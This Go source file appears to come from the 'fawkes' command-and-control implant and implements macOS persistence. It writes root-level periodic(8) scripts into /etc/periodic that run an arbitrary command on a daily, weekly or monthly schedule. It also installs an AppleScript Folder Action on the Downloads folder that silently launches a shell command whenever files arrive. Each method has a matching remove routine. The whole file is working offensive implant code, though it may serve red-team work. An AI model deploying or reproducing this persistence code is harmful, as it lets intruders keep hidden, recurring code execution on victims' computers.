//go:build darwin

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// persistPeriodic handles install/remove of periodic(8) scripts in /etc/periodic/
func persistPeriodic(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistPeriodicInstall(args)
	case "remove":
		return persistPeriodicRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistPeriodicInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (command to persist) is required")
	}
	if os.Getuid() != 0 {
		return errorResult("Error: periodic scripts require root (install to /etc/periodic/)")
	}

	name := "500.fawkes"
	if args.Name != "" {
		if !strings.HasPrefix(args.Name, "5") && !strings.HasPrefix(args.Name, "6") &&
			!strings.HasPrefix(args.Name, "7") && !strings.HasPrefix(args.Name, "8") &&
			!strings.HasPrefix(args.Name, "9") {
			name = "500." + args.Name
		} else {
			name = args.Name
		}
	}

	frequency := "daily"
	if args.Schedule != "" {
		switch strings.ToLower(args.Schedule) {
		case "daily", "weekly", "monthly":
			frequency = strings.ToLower(args.Schedule)
		default:
			return errorf("Invalid schedule: %s. Use: daily, weekly, monthly", args.Schedule)
		}
	}

	periodicDir := filepath.Join("/etc/periodic", frequency)
	scriptPath := filepath.Join(periodicDir, name)

	script := fmt.Sprintf("#!/bin/sh\n# periodic persistence script\n%s\n", args.Path)

	if err := os.WriteFile(scriptPath, []byte(script), 0755); err != nil {
		return errorf("Failed to write %s: %v", scriptPath, err)
	}

	return successResult(fmt.Sprintf("Periodic script persistence installed:\n  Script: %s\n  Frequency: %s\n  Command: %s\n  Status: will run on next periodic %s execution\n\nRemove with: persist -method periodic -action remove -name %s -schedule %s",
		scriptPath, frequency, args.Path, frequency, name, frequency))
}

func persistPeriodicRemove(args persistArgs) structs.CommandResult {
	if os.Getuid() != 0 {
		return errorResult("Error: periodic scripts require root")
	}

	name := "500.fawkes"
	if args.Name != "" {
		if !strings.HasPrefix(args.Name, "5") {
			name = "500." + args.Name
		} else {
			name = args.Name
		}
	}

	frequencies := []string{"daily", "weekly", "monthly"}
	if args.Schedule != "" {
		frequencies = []string{strings.ToLower(args.Schedule)}
	}

	for _, freq := range frequencies {
		scriptPath := filepath.Join("/etc/periodic", freq, name)
		if _, err := os.Stat(scriptPath); err == nil {
			if err := os.Remove(scriptPath); err != nil {
				return errorf("Failed to remove %s: %v", scriptPath, err)
			}
			return successResult(fmt.Sprintf("Removed periodic script: %s", scriptPath))
		}
	}

	return errorf("No periodic script found named '%s'", name)
}

// persistFolderAction attaches an AppleScript Folder Action to a directory.
func persistFolderAction(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistFolderActionInstall(args)
	case "remove":
		return persistFolderActionRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistFolderActionInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (command to execute when files are added) is required")
	}

	name := "fawkes"
	if args.Name != "" {
		name = args.Name
	}

	home, _ := os.UserHomeDir()
	targetDir := filepath.Join(home, "Downloads")
	if args.Schedule != "" {
		targetDir = args.Schedule
	}

	scriptName := name + ".scpt"
	scriptsDir := filepath.Join(home, "Library", "Scripts", "Folder Action Scripts")
	os.MkdirAll(scriptsDir, 0755)
	scriptPath := filepath.Join(scriptsDir, scriptName)

	appleScript := fmt.Sprintf(`on adding folder items to this_folder after receiving added_items
	do shell script "%s &> /dev/null &"
end adding folder items to`, strings.ReplaceAll(args.Path, `"`, `\"`))

	if err := os.WriteFile(scriptPath, []byte(appleScript), 0644); err != nil {
		return errorf("Failed to write script: %v", err)
	}

	// Use osascript to attach the folder action
	attachScript := fmt.Sprintf(`
tell application "System Events"
	if not (exists folder action "%s") then
		make new folder action at end of folder actions with properties {name:"%s", path:"%s"}
	end if
	tell folder action "%s"
		make new script at end of scripts with properties {name:"%s", path:"%s"}
	end tell
	set folder actions enabled to true
end tell`, targetDir, targetDir, targetDir, targetDir, scriptName, scriptPath)

	cmd := exec.Command("osascript", "-e", attachScript)
	if out, err := cmd.CombinedOutput(); err != nil {
		return successResult(fmt.Sprintf("Folder Action script created at %s but osascript attachment failed (may need Accessibility permissions): %v\n%s\n\nManual attachment: open Folder Actions Setup.app and attach %s to %s",
			scriptPath, err, string(out), scriptPath, targetDir))
	}

	return successResult(fmt.Sprintf("Folder Action persistence installed:\n  Script: %s\n  Target Folder: %s\n  Command: %s\n  Trigger: fires when new files are added to %s\n\nRemove with: persist -method folder-action -action remove -name %s",
		scriptPath, targetDir, args.Path, targetDir, name))
}

func persistFolderActionRemove(args persistArgs) structs.CommandResult {
	name := "fawkes"
	if args.Name != "" {
		name = args.Name
	}

	home, _ := os.UserHomeDir()
	scriptName := name + ".scpt"
	scriptPath := filepath.Join(home, "Library", "Scripts", "Folder Action Scripts", scriptName)

	// Try to detach via osascript
	detachScript := fmt.Sprintf(`
tell application "System Events"
	repeat with fa in folder actions
		tell fa
			repeat with s in scripts
				if name of s is "%s" then
					delete s
				end if
			end repeat
		end tell
	end repeat
end tell`, scriptName)

	exec.Command("osascript", "-e", detachScript).Run()

	if _, err := os.Stat(scriptPath); err == nil {
		if err := os.Remove(scriptPath); err != nil {
			return errorf("Failed to remove %s: %v", scriptPath, err)
		}
		return successResult(fmt.Sprintf("Removed Folder Action: %s (script detached + deleted)", scriptPath))
	}

	return errorf("No Folder Action script found named '%s'", scriptName)
}
